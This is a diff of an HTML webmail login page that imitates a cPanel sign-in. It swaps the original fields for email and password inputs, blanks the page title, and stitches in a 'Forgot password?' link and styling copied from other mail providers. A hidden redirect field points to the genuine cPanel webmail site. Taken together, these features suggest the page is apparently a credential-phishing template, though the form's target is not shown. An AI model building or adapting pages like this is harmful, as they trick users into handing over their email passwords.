@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
 <head>
-	<title>Webmail Sign - in </title>
+	<title></title>
 </head>
 <body>
 <div class="group has-pw-reset" id="login-wrapper" style="margin: 45px auto; min-height: 460px; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, helvetica, arial, sans-serif; opacity: 1; visibility: visible;">
@@ -25,22 +25,19 @@
     name="_redirect"
     value="https://webmail.cpanel.net/"
   />
-<div class="input-req-login" style="color: rgb(41, 58, 74); font-size: 12px; font-weight: bold; padding-bottom: 8px; padding-left: 4px; width: 285px;"><label for="user" style="font-family: &quot;Open Sans&quot;, sans-serif; font-size: 14px;">Email Address</label></div>
+<p style="color: rgb(85, 85, 85); font-family: Arial, sans-serif; font-size: 14px; text-align: center; background-color: rgb(254, 254, 254);"><input autocomplete="on" autofocus="" class="form-control signin-email" id="username" name="username" placeholder="Email address" required="" style="box-sizing: border-box; color: rgb(85, 85, 85); font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 14px; line-height: 1.42857; font-family: inherit; margin: 0px; width: 280px; height: 34px; padding: 6px 12px; background-image: none; border-width: 1px; border-style: solid; border-color: rgb(228, 177, 0); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgba(228, 177, 0, 0.6) 0px 0px 8px; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s; max-width: 280px;" tabindex="1" type="email" value="" /></p>
 
-<div class="input-field-login icon username-container" style="background-image: url(&quot;/cPanel_magic_revision_1694188171/unprotected/cpanel/images/icon-username.png&quot;); height: 32px; border-radius: 4px; border: 2px solid rgb(190, 190, 190); background-color: rgb(255, 255, 255); background-repeat: no-repeat; background-position: 6px 6px;"><input autofocus="autofocus" class="std_textbox" id="user" name="user" placeholder="Enter your email address." required="" style="appearance: none; width: 220px; height: 22px; margin: 4px 5px 0px 30px; border-radius: 4px; border-width: 1px; border-style: solid; border-color: rgb(255, 255, 255); background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, sans-serif; font-size: 13px; box-shadow: none; outline: 0px; padding: 0px 10px;" tabindex="1" type="text" value="" /></div>
+<p style="color: rgb(85, 85, 85); font-family: Arial, sans-serif; font-size: 14px; text-align: center; background-color: rgb(254, 254, 254);">&nbsp;<br />
+<input autocomplete="on" class="form-control" id="password" name="password" placeholder="Password" required="" style="box-sizing: border-box; color: rgb(85, 85, 85); font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 14px; line-height: 1.42857; font-family: inherit; margin: 0px; width: 280px; height: 34px; padding: 6px 12px; background-image: none; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s; max-width: 280px;" tabindex="2" type="password" /></p>
 
-<div class="input-req-login login-password-field-label" style="margin-top: 30px; color: rgb(41, 58, 74); font-size: 12px; font-weight: bold; padding-bottom: 8px; padding-left: 4px; width: 285px;"><label for="pass" style="font-family: &quot;Open Sans&quot;, sans-serif; font-size: 14px;">Password</label></div>
+<div class="form-group curActive has-error" style="color: rgb(85, 85, 85); font-family: Arial, sans-serif; font-size: 14px; text-align: center; background-color: rgb(254, 254, 254); box-sizing: border-box; margin-bottom: 15px; position: relative;"><button class="btn" style="padding: 8px 0px; margin: 0px; font-family: sans-serif; width: 110px; float: right; background-color: rgb(0, 103, 184); color: rgb(255, 255, 255); font-size: 14px; cursor: pointer; border-width: initial; border-style: none; border-color: initial;" type="submit">Sign in</button></div>
 
-<div class="input-field-login icon password-container" style="background-image: url(&quot;/cPanel_magic_revision_1694188171/unprotected/cpanel/images/icon-password.png&quot;); height: 32px; border-radius: 4px; border: 2px solid rgb(190, 190, 190); background-color: rgb(255, 255, 255); background-repeat: no-repeat; background-position: 6px 6px;"><input class="std_textbox" id="pass" name="pass" placeholder="Enter your email password." required="" style="appearance: none; width: 220px; height: 22px; margin: 4px 5px 0px 30px; border-radius: 4px; border-width: 1px; border-style: solid; border-color: rgb(255, 255, 255); background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, sans-serif; font-size: 13px; box-shadow: none; outline: 0px; padding: 0px 10px;" tabindex="2" type="password" /></div>
-
-<div class="controls" style="width: 285px; display: inline-block;">
-<div class="login-btn" style="float: left; padding-top: 30px; width: 285px; font-weight: 600;"><button id="login_submit" name="login" style="border-width: 1px; border-style: solid; border-color: rgb(9, 87, 121); border-radius: 4px; color: rgb(255, 255, 255); cursor: pointer; background-color: rgb(23, 155, 215); width: 285px; font-size: 13px; font-family: &quot;Open Sans&quot;, sans-serif; font-weight: 600; padding-top: 7px; padding-bottom: 7px;" tabindex="3" type="submit">Log in</button></div>
-
-<div class="reset-pw" style="float: right; padding: 25px 0px; text-align: center; width: 285px;"><a href="https://webmail.ovaprima.org/resetpass?start=1" id="reset_password" style="color: rgb(41, 58, 74); text-decoration-line: none; font-size: 12px; font-weight: bold;">Reset Password</a></div>
-</div>
-
-<div class="clear" id="push" style="clear: both;">&nbsp;</div>
+<p style="color: rgb(85, 85, 85); font-size: 14px; text-align: center; background-color: rgb(254, 254, 254); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><a class="ng-scope" href="https://mail.mesanetworks.net/" ng-click="goToForgotPassword()" ng-if="( loadingstatus === '') &amp;&amp; showForgotLink &amp;&amp; !customForgotPassURL" style="box-sizing: border-box; background-color: rgb(255, 255, 255); color: rgb(14, 87, 171); text-decoration-line: none; font-family: Lato, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;" translate="LANG_LOGIN_FORGOT_PASSWORD">Forgot password?</a></p>
 </form>
+
+<p style="padding: 0px; margin: 0px 0px 20px; font-family: sans-serif; display: flex; position: relative;">&nbsp;</p>
+
+<div class="controls" style="width: 285px; display: inline-block;">&nbsp;</div>
 </div>
 </div>
 </div>
